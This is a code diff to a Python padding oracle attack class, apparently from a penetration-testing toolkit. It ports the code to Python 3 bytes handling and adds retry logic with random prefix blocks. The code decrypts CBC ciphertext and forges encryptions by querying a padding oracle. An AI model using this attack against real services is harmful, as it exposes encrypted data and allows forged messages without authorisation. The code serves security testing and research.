@@ -51,12 +51,13 @@ class POA:
     block_size = None
 
     ## public (r/w ok)
+    retries = 2
     decrypted = None
     threads = None
     log_fh = None
     
     def __init__(self, oracle, block_size, ciphertext, iv=None,
-                 threads=1, decrypted='', log_file=None):
+                 threads=1, decrypted=b'', log_file=None):
         """Creates a new padding oracle attack (POA) object. 
 
         Arguments:
@@ -109,7 +110,7 @@ class POA:
         self._oracle = oracle
         self._ciphertext = ciphertext
         if iv == None:
-            self._iv = '\x00'*self.block_size
+            self._iv = b'\x00'*self.block_size
         else:
             self._iv = iv
 
@@ -140,7 +141,7 @@ class POA:
         for i in range(0-self.block_size,0):
             if i == -1:
                 break
-            tweaked = struct.unpack("B", prior[i])[0] ^ 0xFF
+            tweaked = prior[i] ^ 0xFF
             tweaked = struct.pack("B", tweaked)
             if not self._oracle(self._ciphertext+prior[:i]+tweaked+prior[i+1:]+final, self._iv):
                 break
@@ -148,20 +149,34 @@ class POA:
         pad_length = 0-i
         self.log_message("Testing suspected pad length: %d" % pad_length)
         if pad_length > 1:
+            # XXX: If this test case fails, we should try instead
+            # lengthing the pad by one byte with all 256 values (as is
+            # done in the 1-byte pad case).
+            #
             # Verify suspected pad length by changing last pad byte to 1
             # and making sure the padding succeeds
-            tweaked = struct.unpack("B", prior[-1])[0] ^ (pad_length^1)
+            tweaked = prior[-1] ^ (pad_length^1)
             tweaked = struct.pack("B", tweaked)
+
+            #XXX: This replaces the pad bytes with spaces.  The hope is
+            #     that any UTF-8 decoding errors that the pad bytes
+            #     might generate are addressed this way.  It is not yet
+            #     well tested.  An option should be added to allow other
+            #     bytes to be used or to turn off the behavior.
+            prior = bytearray(prior)
+            for q in range(-16,-1):
+                prior[q] = prior[q]^(pad_length^32) # space
+
             if self._oracle(self._ciphertext+prior[:-1]+tweaked+final, self._iv):
                 ret_val = buffertools.pkcs7Pad(pad_length)
 
         else:
             # Verify by changing pad byte to 2 and brute-force changing
             # second-to-last byte to 2 as well
-            tweaked = struct.unpack("B", prior[-1])[0] ^ (2^1)
+            tweaked = prior[-1] ^ (2^1)
             tweaked = struct.pack("B", tweaked)
             for j in range(1,256):
-                guess = struct.unpack("B", prior[-2])[0] ^ j
+                guess = prior[-2] ^ j
                 guess = struct.pack("B", guess)
                 if self._oracle(self._ciphertext+prior[:-2]+guess+tweaked+final, self._iv):
                     # XXX: Save the decrypted byte for later
@@ -176,7 +191,7 @@ class POA:
             if self._thread_result != None:
                 # Stop if another thread found the result
                 break
-            if self._oracle(str(prefix+struct.pack("B",b)+suffix), self._iv):
+            if self._oracle(prefix+struct.pack("B",b)+suffix, self._iv):
                 self._thread_result = b
                 break
 
@@ -200,37 +215,52 @@ class POA:
             return known_bytes
         
         prior_prefix = prior[0:self.block_size-numKnownBytes-1]
-        base = ord(prior[self.block_size-numKnownBytes-1])
+        base = prior[self.block_size-numKnownBytes-1]
         # Adjust known bytes to appear as a PKCS 7 pad
         suffix = [0]*numKnownBytes
         for i in range(0,numKnownBytes):
-            suffix[i] ^= ord(prior[0-numKnownBytes+i])^ord(known_bytes[i])^(numKnownBytes+1)
+            suffix[i] ^= prior[0-numKnownBytes+i]^known_bytes[i]^(numKnownBytes+1)
         suffix = struct.pack("B"*len(suffix),*suffix)+block
 
-        # Each thread spawned searches a subset of the next byte's 
-        # 256 possible values
-        self._thread_result = None
-        threads = []
-        for i in range(0,self.threads):
-            t = threading.Thread(target=self._test_value_set, 
-                                 args=(self._ciphertext+prior_prefix, suffix, range(i,256,self.threads)))
-            t.start()
-            threads.append(t)
-            
-        for t in threads:
-            t.join()
-        
+
+        for x in range(0, 1+self.retries):
+            # Each thread spawned searches a subset of the next byte's 
+            # 256 possible values
+            self._thread_result = None
+            threads = []
+            for i in range(0,self.threads):
+                t = threading.Thread(target=self._test_value_set, 
+                                     args=(self._ciphertext+prior_prefix, suffix, range(i,256,self.threads)))
+                t.start()
+                threads.append(t)
+                
+            for t in threads:
+                t.join()
+                
+            # If a byte fails to decrypt, it could be because the prior
+            # block's decrypted value violates UTF-8 decoding rules, or
+            # because it randomly introduced a delimiter that causes
+            # problems.  If retries are enabled, we insert an additional
+            # random block before the prior block so that the decrypted
+            # value can be changed.
+            if self._thread_result == None:
+                if x < self.retries:
+                    self.log_message("Value of a byte could not be determined. Retrying...")
+                    prior_prefix = bytes([random.getrandbits(8) for i in range(self.block_size)]) + prior_prefix
+            else:
+                break
+
         if self._thread_result == None:
             self.log_message("Value of a byte could not be determined.  Current plaintext suffix: "+ repr(self.decrypted))
             raise Exception #XXX: custom exception
-
+        
         decrypted = struct.pack("B",self._thread_result^base^(numKnownBytes+1))
         self.decrypted = decrypted + self.decrypted
         #  Return previous bytes together with current byte
         return decrypted+known_bytes 
     
 
-    def decrypt_block(self, prior, block, last_bytes=''):
+    def decrypt_block(self, prior, block, last_bytes=b''):
         """Decrypts the block of ciphertext provided as a parameter.
 
         """
@@ -265,7 +295,7 @@ class POA:
         num_partial = len(self.decrypted) % self.block_size
 
         # number of blocks fully decrypted
-        finished_blocks = len(self.decrypted) / self.block_size
+        finished_blocks = len(self.decrypted) // self.block_size
 
         # contents of the partial block
         partial = self.decrypted[0:num_partial]
@@ -280,7 +310,7 @@ class POA:
         # the ciphertext yet.
         for i in range(len(blocks)-1-finished_blocks, 0, -1):
             decrypted = self.decrypt_block(blocks[i-1], blocks[i], partial) + decrypted
-            partial = ''
+            partial = b''
                 
         # Finally decrypt first block
         decrypted = self.decrypt_block(self._iv, blocks[0], partial) + decrypted
@@ -302,7 +332,7 @@ class POA:
         if len(plaintext) != self.block_size or len(plaintext) != len(ciphertext):
             raise InvalidBlockError(self.block_size,len(plaintext))
 
-        ptext = self.decrypt_block('\x00'*self.block_size, ciphertext)
+        ptext = self.decrypt_block(b'\x00'*self.block_size, ciphertext)
         prior = buffertools.xorBuffers(ptext, plaintext)
         return prior,ciphertext
     
@@ -346,4 +376,4 @@ class POA:
             ciphertext = cblock+ciphertext
         
         # prior as IV
-        return str(prior),str(ciphertext)
+        return prior,ciphertext
